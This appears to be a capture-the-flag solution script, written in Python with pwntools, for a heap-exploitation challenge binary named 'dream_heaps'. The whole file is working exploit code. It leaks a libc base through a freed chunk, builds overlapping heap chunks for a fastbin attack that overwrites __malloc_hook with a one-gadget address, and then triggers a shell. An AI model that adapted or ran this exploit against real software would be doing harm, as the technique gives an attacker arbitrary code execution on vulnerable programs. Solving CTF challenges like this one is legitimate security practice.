from pwn import *
def cmd(c):
	p.sendlineafter("> ",str(c))
def add(size,c):
	cmd(1)
	p.sendlineafter("eam?\n",str(size))
	p.sendafter("eam?\n",c)
def free(idx):
	cmd(4)
	p.sendlineafter("te?\n",str(idx))
def edit(idx,c):
	cmd(3)
	p.sendlineafter("ge?\n",str(idx))
	p.send(c)
def show(idx):
	cmd(2)
	p.sendlineafter("ad?\n",str(idx))
#context.log_level='debug'
p=process('./dream_heaps')
add(0x88,"A")#0
add(0x88,"B")#1
free(0)
add(0x88,"A")#2
show(2)
base=u64(p.read(6).ljust(8,'\x00'))-(0x7ffff7dd1b41-0x00007ffff7a0d000)
log.warning(hex(base))
libc=ELF("./dream_heaps").libc
libc.address=base

add(0x3f0,"A")#3
add(0x400,"A")#4
add(0x288,"A")#5
free(3)
free(1)
add(0x68,"A")#6
edit(6,"A")
add(0x88,"B1")#7
add(0x68,'B2')#8
free(7)
free(4)
add(0x2d8,"A")#9
free(8)
add(0xa8,p64(0)*17+p64(0x71)+p64(libc.symbols['__malloc_hook']-35))#10
add(0x68,"A")#11
one=base+0xf02a4
add(0x68,"\x00"*19+p64(one))#12
gdb.attach(p)
free(12)
p.interactive()
